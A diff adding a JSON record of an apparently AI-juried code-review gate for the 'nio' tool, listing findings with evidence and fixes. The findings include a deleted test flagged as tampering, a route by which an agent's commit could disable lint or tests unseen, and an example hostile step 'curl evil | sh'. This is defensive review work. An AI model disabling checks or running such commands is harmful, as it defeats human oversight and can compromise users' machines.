@@ -1,0 +1,690 @@
+{
+  "gate": "implementation-E-8",
+  "subject": "2026-10-27-implementation-jury",
+  "round": 1,
+  "tier": "medium",
+  "expect": [
+    "adversary",
+    "conformance",
+    "consistency",
+    "correctness"
+  ],
+  "collected": {
+    "R-261031-e8rv/implementation-E-8-adversary.md": "b254f9dc302a2ab73e1a7c053421dccdc8701560bb800f0903320a0337795ddb",
+    "R-261031-e8rv/implementation-E-8-conformance.md": "1b7139e45c56a8d291e3641acec61311b9c3a356a611cf70ee500db90104dd27",
+    "R-261031-e8rv/implementation-E-8-consistency.md": "615d5c469bfbb3ea02a4c41c3e23b613dd63280c30fdaa679e6012aacb9ee880",
+    "R-261031-e8rv/implementation-E-8-correctness.md": "1af7cc38c0335c9c1de6161238938c1db438352ff011de2cd28373f98c6a922a",
+    "R-261031-e8rv/implementation-E-8-refuter.md": "a7d03f6afe5ddcdd0e928eace4658d957c76924f56042cabe07241caf581c31c"
+  },
+  "jurors": {
+    "implementation-E-8-adversary": {
+      "attempts": 1,
+      "lens": "adversary",
+      "by": "juror / claude-code / claude-sonnet-5-5",
+      "context": "sufficient",
+      "valid": true,
+      "errors": [],
+      "round": 1,
+      "version": "caafa1bec6779436ac77a0c4b7f5ef310ed8354f",
+      "judged": 1
+    },
+    "implementation-E-8-conformance": {
+      "attempts": 1,
+      "lens": "conformance",
+      "by": "juror / claude-code / claude-sonnet-5-5",
+      "context": "sufficient",
+      "valid": true,
+      "errors": [],
+      "round": 1,
+      "version": "caafa1bec6779436ac77a0c4b7f5ef310ed8354f",
+      "judged": 1
+    },
+    "implementation-E-8-consistency": {
+      "attempts": 1,
+      "lens": "consistency",
+      "by": "juror / claude-code / claude-haiku-5-5",
+      "context": "sufficient",
+      "valid": true,
+      "errors": [],
+      "round": 1,
+      "version": "caafa1bec6779436ac77a0c4b7f5ef310ed8354f",
+      "judged": 1
+    },
+    "implementation-E-8-correctness": {
+      "attempts": 1,
+      "lens": "correctness",
+      "by": "juror / claude-code / claude-sonnet-5-5",
+      "context": "sufficient",
+      "valid": true,
+      "errors": [],
+      "round": 1,
+      "version": "caafa1bec6779436ac77a0c4b7f5ef310ed8354f",
+      "judged": 1
+    }
+  },
+  "findings": [
+    {
+      "id": "J-1",
+      "title": "T-22: tests/test_tasks.py isn't in the epic's diff",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "AC-33",
+        "AC-35",
+        "AC-50"
+      ],
+      "evidence": "observed",
+      "quotes": [],
+      "fix": "",
+      "gap": "T-22 names tests/test_tasks.py, which no commit of the epic changed",
+      "where": "tests/test_tasks.py",
+      "tampering": false,
+      "origin": "checks",
+      "sources": [
+        {
+          "juror": "cli",
+          "lens": "cli",
+          "situation": "T-22 names tests/test_tasks.py, which no commit of the epic changed",
+          "severity": "major",
+          "round": 0
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "the CLI's own check; no refuter",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 0,
+      "last_round": 0
+    },
+    {
+      "id": "J-2",
+      "title": "T-30: tests/test_flow.py isn't in the epic's diff",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "AC-32",
+        "AC-40"
+      ],
+      "evidence": "observed",
+      "quotes": [],
+      "fix": "",
+      "gap": "T-30 names tests/test_flow.py, which no commit of the epic changed",
+      "where": "tests/test_flow.py",
+      "tampering": false,
+      "origin": "checks",
+      "sources": [
+        {
+          "juror": "cli",
+          "lens": "cli",
+          "situation": "T-30 names tests/test_flow.py, which no commit of the epic changed",
+          "severity": "major",
+          "round": 0
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "the CLI's own check; no refuter",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 0,
+      "last_round": 0
+    },
+    {
+      "id": "J-3",
+      "title": "T-33: tests/test_flow.py isn't in the epic's diff",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "AC-1",
+        "AC-40"
+      ],
+      "evidence": "observed",
+      "quotes": [],
+      "fix": "",
+      "gap": "T-33 names tests/test_flow.py, which no commit of the epic changed",
+      "where": "tests/test_flow.py",
+      "tampering": false,
+      "origin": "checks",
+      "sources": [
+        {
+          "juror": "cli",
+          "lens": "cli",
+          "situation": "T-33 names tests/test_flow.py, which no commit of the epic changed",
+          "severity": "major",
+          "round": 0
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "the CLI's own check; no refuter",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 0,
+      "last_round": 0
+    },
+    {
+      "id": "J-4",
+      "title": "test tampering: test_ac29_epic_skipped in tests/test_implement.py is deleted",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [],
+      "evidence": "observed",
+      "quotes": [],
+      "fix": "",
+      "gap": "the diff deletes the test test_ac29_epic_skipped from tests/test_implement.py",
+      "where": "tests/test_implement.py",
+      "tampering": true,
+      "origin": "checks",
+      "sources": [
+        {
+          "juror": "cli",
+          "lens": "cli",
+          "situation": "the diff deletes the test test_ac29_epic_skipped from tests/test_implement.py",
+          "severity": "major",
+          "round": 0
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "the CLI's own check; no refuter",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 0,
+      "last_round": 0
+    },
+    {
+      "id": "J-5",
+      "title": "The diff jurors read excludes all of `.nio/`, so a task commit can switch off the suite or lint and no one sees it",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "CT-6",
+        "CT-20",
+        "FR-10"
+      ],
+      "evidence": "observed",
+      "quotes": [
+        "`return records.git(root, \"diff\", *flags, base, head, \"--\", \".\", \":(exclude).nio\")`"
+      ],
+      "fix": "Exclude only what is jury-private (`.nio/specs/*/jury`, `.nio/runs`, `.nio/memory`) and keep config, `tests.md` and `quickstart.md` in the diff. As well, in `record_cli`, do not mark a CLI finding fixed when its check is `not configured` now but was configured when the finding was raised.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-adversary",
+          "lens": "adversary",
+          "situation": "The exclusion is meant to hide ledgers and other jurors' findings, but it also covers `.nio/config.json`, `.nio/specs/<slug>/tests.md` and `quickstart.md`. Those files decide what `collect` runs. `collect` reads them from the working tree. `tampering()` only inspects files matching `TEST_FILE`, and `phantoms` and `hints` exclude `.nio` too. A fix task for \"the lint check failed\" can unset `tests.lint`, or point `tests.suite` at `true`. Every lens pack shows no such change. With the new `origin=\"checks\"` rule, the next `collect` no longer reports `the lint check failed` (the check is now `not configured`). `record_cli` then marks the finding `fixed`, with no juror judging it. The gate goes on to approval.",
+          "severity": "major",
+          "round": 1
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "`code_diff` excludes all of `.nio` (evidence.py:166), and `collect` reads `tests.*` from the working-tree config via `records.config(root)` (evidence.py:343). A task commit that unsets `tests.lint` therefore shows in no pack. The next `collect` then no longer reports the lint finding, and `record_cli` marks it `fixed` (jury.py:806-808).",
+      "status": "disposed",
+      "disposition": "fix-task",
+      "by": "agent",
+      "note": "fix task T-48",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "partial",
+      "where": "src/nio/evidence.py:code_diff, src/nio/jury.py:record_cli",
+      "tampering": false
+    },
+    {
+      "id": "J-6",
+      "title": "The crash-mend check matches an approval commit of any effort, so a crashed approval is reported as closed",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "CT-17",
+        "FR-26"
+      ],
+      "evidence": "inferred",
+      "quotes": [
+        "`not records.git(root, \"log\", \"-1\", \"--format=%H\", f\"--grep=^{message}$\")`"
+      ],
+      "fix": "Make the \"already committed\" test specific to the effort. For example, put the slug in the message, or check that `gate_paths` has no uncommitted change AND that the commit touches this effort's folder (`git log -1 -- .nio/specs/<slug>`).",
+      "sources": [
+        {
+          "juror": "implementation-E-8-adversary",
+          "lens": "adversary",
+          "situation": "The commit message is `nio: approve implementation-E-n`. It names no effort, and every effort has an E-1. Effort B's `nio flow done implementation-E-1` crashes after writing the `epic` line and before the commit. `crashed` is computed as false, because an earlier effort A's identical \"nio: approve implementation-E-1\" is already in HEAD's history. `entries` is empty, so the code prints \"is closed already (approved); nothing to do\" and exits 0. B's `epic` line, any `pass` line and the verdict records stay uncommitted. It fails silently as success.",
+          "severity": "major",
+          "round": 1
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "The crash test greps all history for `^nio: approve implementation-E-n$` (flow.py:1046-1047). That message names no effort (flow.py:1036), so another effort's E-1 approval commit makes `crashed` false. With `entries` empty, flow.py:1048-1049 then returns \"closed already ... nothing to do\" with exit 0.",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "missing",
+      "where": "src/nio/flow.py:epic_done",
+      "tampering": false
+    },
+    {
+      "id": "J-7",
+      "title": "A change request is matched to a finding by free-text search, so one request can settle or reject another finding",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "CT-15",
+        "FR-44",
+        "AC-58",
+        "AC-59"
+      ],
+      "evidence": "inferred",
+      "quotes": [
+        "`if meta.get(\"type\") == \"change\" and f\"/{slug}/spec.md\" in str(meta.get(\"against\")) and named(text, fid, r\"\\d\") and named(text, gate, r\"[\\w-]\"):`"
+      ],
+      "fix": "Match on a machine field, not on text. For example, put `finding: J-n` and `gate:` lines in the request's frontmatter and match those exactly, or key the request by the title `Code is right, spec is stale: J-n at <gate>`.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-adversary",
+          "lens": "adversary",
+          "situation": "`change_for` takes the first (sorted) `C-*.md` whose whole text mentions `J-n` and the gate. `raise_change` copies each finding's lens-written `situation` text into the request. Say J-3 is a code-is-right finding, and its situation text says \"same cause as J-1\". J-1 is another code-is-right finding at the same gate, with no request of its own yet. `settle` finds J-3's request as J-1's, so no request is raised for J-1. When the human accepts J-3's request, J-1 is disposed `accepted-risk` with `by=\"human\"`, though the human never ruled on J-1.",
+          "severity": "major",
+          "round": 1
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "`change_for` matches on the whole text of any `C-*.md` containing `J-n` and the gate (jury.py:1100). `raise_change` copies each source's free-text `situation` into the request (jury.py:1127). A situation that mentions another finding's ID therefore lets that other finding be held by the request, or be marked `accepted-risk` with `by=\"human\"` when the request is accepted (jury.py:1142-1152).",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "partial",
+      "where": "src/nio/jury.py:change_for, settle",
+      "tampering": false
+    },
+    {
+      "id": "J-8",
+      "title": "`check --record` writes `tasks.md` and the ledger with no lock, so two runs together lose a fix task",
+      "kind": "gap",
+      "severity": "major",
+      "cites": [
+        "AC-50",
+        "FR-26",
+        "FR-27"
+      ],
+      "evidence": "inferred",
+      "quotes": [
+        "`tmp = p.with_name(p.name + \".tmp\")`"
+      ],
+      "fix": "Hold `flow.lock(root, slug)` around the whole of `check --record` at an implementation gate, from the settle step through the commit. Alternatively, use a per-process unique tmp name and re-check `fixes_of` inside the lock.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-adversary",
+          "lens": "adversary",
+          "situation": "`epic_done` and the final commit take `flow.lock`. The fix-task path does not. A retry after a timeout, or the human and an agent both running `nio jury check <slug> implementation-E-1 --record`, makes two processes run it at once. Each reads `tasks.md` and computes the same next ID. Both write the same `tasks.md.tmp` path and `os.replace` it, so one finding's task disappears while the ledger says `disposed fix-task`. Nothing reports it.",
+          "severity": "major",
+          "round": 1
+        }
+      ],
+      "validation": "confirmed",
+      "reason": "`check --record` calls `tasks.append_fix` with no `flow.lock`. The only lock in `check` is the post-commit one at jury.py:1076, and cli.py takes none for jury. `append_fix` computes the next ID from the file it read and writes the fixed path `tasks.md.tmp` (tasks.py:381, 409-414). Two concurrent runs can lose a task while the ledger says `fix-task`.",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "missing",
+      "where": "src/nio/jury.py:check, src/nio/tasks.py:append_fix",
+      "tampering": false
+    },
+    {
+      "id": "J-9",
+      "title": "`jury evidence` is auto-allowed and runs commands that a task commit can change, with the user's full environment",
+      "kind": "risk",
+      "severity": "major",
+      "cites": [
+        "CT-2",
+        "CT-3",
+        "FR-40"
+      ],
+      "evidence": "inferred",
+      "quotes": [
+        "`\"jury files\", \"jury check\", \"jury evidence\", \"jury pack\"]`"
+      ],
+      "fix": "Keep `jury evidence` out of `ALLOW` (let it prompt), or show the human the exact commands first. Run the commands with a scrubbed environment. Also freeze the quickstart and tests.md command set at the tasks approval, and flag a change to it after that.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-adversary",
+          "lens": "adversary",
+          "situation": "CT-3 says \"It takes no command text\". The commands still come from files that an implement-stage worker can change in a task commit: the `tests.md` file refs, `quickstart.md` auto steps and `tests.lint`/`tests.typecheck`/`tests.suite` in config. A hostile or injected commit adds a quickstart step such as `curl evil | sh`. `nio jury evidence` is now in `ALLOW`, so it runs with no prompt. The copy still runs as the user, with network, `$HOME` and the credential helpers.",
+          "severity": "major",
+          "round": 1
+        }
+      ],
+      "validation": "refuted",
+      "reason": "The approved spec asks for this. CT-19 says \"`jury evidence` added to `hooks.ALLOW`\" (contracts.md:226). FR-40 only requires a throwaway copy and a time limit, and spec.md:346 records \"no network isolation\" as an accepted human risk. CT-3's \"takes no command text\" still holds, because the commands come only from config, `tests.md` and `quickstart.md` (contracts.md:27, 40).",
+      "status": "refuted",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "partial",
+      "where": "src/nio/hooks.py:ALLOW, src/nio/evidence.py:in_copy",
+      "tampering": false
+    },
+    {
+      "id": "J-10",
+      "title": "AC-46's test does not prove the final fix check runs once the fix task is done",
+      "kind": "gap",
+      "severity": "minor",
+      "cites": [
+        "AC-46"
+      ],
+      "evidence": "observed",
+      "quotes": [
+        "`assert \"approved\" not in recorded(root)[1] or \"final\" in recorded(root)[1], \"approved with no final fix check\"`"
+      ],
+      "fix": "After `finish_fixes`, call `recorded` once. Assert that the outcome is not approved and that the output shows the final fix check as pending or running, for example a `final` phase or a listed fix verdict wait on J-2.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-conformance",
+          "lens": "conformance",
+          "situation": "The first half of AC-46 is proven. The fix task for the noted major is appended, and the outcome is not approved while the task is undone. The second half is not. The assertion after `finish_fixes` calls `recorded` twice, so it compares two different runs. It passes if the output merely lacks \"approved\", and it never checks that the final fix check actually runs or is pending. The spec says \"the gate's state shows the final fix check pending until the task is done\". No assertion reads such a state.",
+          "severity": "minor",
+          "round": 1
+        }
+      ],
+      "validation": "grounded",
+      "reason": "",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "partial",
+      "where": "tests/test_evidence.py",
+      "tampering": false
+    },
+    {
+      "id": "J-11",
+      "title": "Tampering finding disposed by an agent as fix-task",
+      "kind": "contradiction",
+      "severity": "major",
+      "cites": [
+        "CT-20",
+        "FR-10"
+      ],
+      "evidence": "observed",
+      "quotes": [
+        "`dispose` of a `tampering` finding by anything but `--by human` → ValueError"
+      ],
+      "fix": "either refuse the agent's `fix-task` on a tampering finding in `dispose` (as CT-20 says), or change CT-20's Fails line by a change request that allows a fix task from the agent while keeping acceptance for the human only.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-consistency",
+          "lens": "consistency",
+          "situation": "a correctness lens confirms a weakened test and records it as tampering. An agent runs `dispose` on it with `--by agent` and disposition `fix-task`. The code accepts the call and the fix task is appended. CT-20 says that call must raise ValueError.",
+          "severity": "major",
+          "round": 1
+        }
+      ],
+      "validation": "refuted",
+      "reason": "Already fixed at HEAD. `dispose` raises only when `f.get(\"tampering\") and by != \"human\" and not routed` (jury.py:858). `tasks.append_fix` is the only caller that passes `routed=True` (tasks.py:418). A direct agent `dispose` of a tampering finding still raises ValueError as CT-20 says. The `routed` path is the spec's FR-26 route to a fix task.",
+      "status": "refuted",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "contradicts",
+      "where": "src/nio/jury.py, `dispose`",
+      "tampering": false
+    },
+    {
+      "id": "J-12",
+      "title": "Printed `unresolved` count includes minors",
+      "kind": "inconsistency",
+      "severity": "minor",
+      "cites": [
+        "CT-13"
+      ],
+      "evidence": "observed",
+      "quotes": [
+        "minors are left out of `unresolved`, `stale` and the fix-check IDs"
+      ],
+      "fix": "exclude `severity == \"minor\"` from that sum, or amend CT-13 if the count is meant to include minors.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-consistency",
+          "lens": "consistency",
+          "situation": "a first review with two confirmed minors and nothing else open is approved. The verdict then prints `unresolved:` with the count of open findings, which includes the two minors, since `to_task` leaves minors `open` and only excludes them by severity. The printed count disagrees with CT-13's rule. The outcome itself is still right (minors never reject). (Whether minors stay `open` is inferred from `to_task`; the count line itself is observed.)",
+          "severity": "minor",
+          "round": 1
+        }
+      ],
+      "validation": "grounded",
+      "reason": "",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "contradicts",
+      "where": "src/nio/jury.py, `check`",
+      "tampering": false
+    },
+    {
+      "id": "J-13",
+      "title": "Test field for a finding with no cite",
+      "kind": "gap",
+      "severity": "minor",
+      "cites": [
+        "CT-14"
+      ],
+      "evidence": "observed",
+      "quotes": [
+        "else `new: <cite>`, which `tasks.check` accepts only with `From:`"
+      ],
+      "fix": "amend CT-14 to read \"else `new: <cite>`, or `new: <finding ID>` when the finding cites nothing\".",
+      "sources": [
+        {
+          "juror": "implementation-E-8-consistency",
+          "lens": "consistency",
+          "situation": "a CLI finding with no cite (the test suite's own fixture, `UNUSED in src/one.py is never used`) gets `Test: new: J-1`. CT-14's `<cite>` has nothing to fill here, so the spec does not say what the field holds. The code's choice is sound and tested, but the spec should say it.",
+          "severity": "minor",
+          "round": 1
+        }
+      ],
+      "validation": "grounded",
+      "reason": "",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "partial",
+      "where": "src/nio/tasks.py, `fix_test`",
+      "tampering": false
+    },
+    {
+      "id": "J-14",
+      "title": "Agent may dispose of a tampering finding, which CT-20 forbids",
+      "kind": "inconsistency",
+      "severity": "minor",
+      "cites": [
+        "CT-20",
+        "FR-10"
+      ],
+      "evidence": "observed",
+      "quotes": [
+        "`Fails: `dispose` of a `tampering` finding by anything but `--by human` → ValueError`"
+      ],
+      "fix": "Set `right: code` and amend CT-20's Fails line to \"dispose of a tampering finding by anything but `--by human`, except as `fix-task`\". Add a test that an agent `accepted-risk` on a tampering finding still fails.",
+      "sources": [
+        {
+          "juror": "implementation-E-8-correctness",
+          "lens": "correctness",
+          "situation": "CT-20 allows no exception, but `dispose` now reads `if f.get(\"tampering\") and by != \"human\" and disposition != \"fix-task\":",
+          "severity": "minor",
+          "round": 1
+        }
+      ],
+      "validation": "grounded",
+      "reason": "",
+      "status": "open",
+      "disposition": "",
+      "by": "",
+      "note": "",
+      "baseline": "new",
+      "rounds": 0,
+      "first_round": 1,
+      "last_round": 1,
+      "gap": "contradicts",
+      "where": "src/nio/jury.py:dispose",
+      "tampering": false
+    }
+  ],
+  "outcome": "rejected",
+  "recorded": [],
+  "versions": {
+    "1": "caafa1bec6779436ac77a0c4b7f5ef310ed8354f"
+  },
+  "matched": {
+    "AC-1": [
+      [
+        "tests/test_evidence.py",
+        "test_it_starts"
+      ]
+    ],
+    "AC-22": [
+      [
+        "tests/test_evidence.py",
+        "test_no_lens_runs_until_the_human_picks_and_the"
+      ]
+    ],
+    "AC-23": [
+      [
+        "tests/test_evidence.py",
+        "test_the_dropped_lens_is_named_in_the_verdict"
+      ]
+    ],
+    "AC-32": [
+      [
+        "tests/test_evidence.py",
+        "test_it_is_rejected_and_a_fix_task_is_appended"
+      ]
+    ],
+    "AC-33": [
+      [
+        "tests/test_evidence.py",
+        "test_the_four_tasks_are_unchanged_and_the_new_one"
+      ]
+    ],
+    "AC-34": [
+      [
+        "tests/test_evidence.py",
+        "test_it_is_approved_and_no_task_is_written"
+      ]
+    ],
+    "AC-35": [
+      [
+        "tests/test_evidence.py",
+        "test_a_justify_or_remove_task_is_appended_and_the"
+      ]
+    ],
+    "AC-36": [
+      [
+        "tests/test_evidence.py",
+        "test_a_change_request_is_raised_and_spec_md_is"
+      ]
+    ],
+    "AC-37": [
+      [
+        "tests/test_evidence.py",
+        "test_it_is_approved_and_the_verdict_lists_both"
+      ]
+    ],
+    "AC-38": [
+      [
+        "tests/test_evidence.py",
+        "test_it_is_human_not_rejected_as_at_the_spec"
+      ]
+    ],
+    "AC-39": [
+      [
+        "tests/test_evidence.py",
+        "test_the_record_names_the_epic_the_outcome_and_the"
+      ]
+    ],
+    "AC-40": [
+      [
+        "tests/test_evidence.py",
+        "test_that_round_is_a_re_review_of_the_open"
+      ]
+    ],
+    "AC-46": [
+      [
+        "tests/test_evidence.py",
+        "test_a_fix_task_for_it_is_appended_to_the"
+      ]
+    ],
+    "AC-50": [
+      [
+        "tests/test_evidence.py",
+        "test_each_finding_has_exactly_one_fix_task"
+      ]
+    ],
+    "AC-56": [
+      [
+        "tests/test_evidence.py",
+        "test_it_is_rejected_one_fix_task_is_appended_for"
+      ]
+    ],
+    "AC-58": [
+      [
+        "tests/test_evidence.py",
+        "test_the_epic_waits_on_the_change_request_and_no"
+      ]
+    ],
+    "AC-59": [
+      [
+        "tests/test_evidence.py",
+        "test_a_fix_task_citing_the_finding_is_appended_and"
+      ]
+    ]
+  }
+}
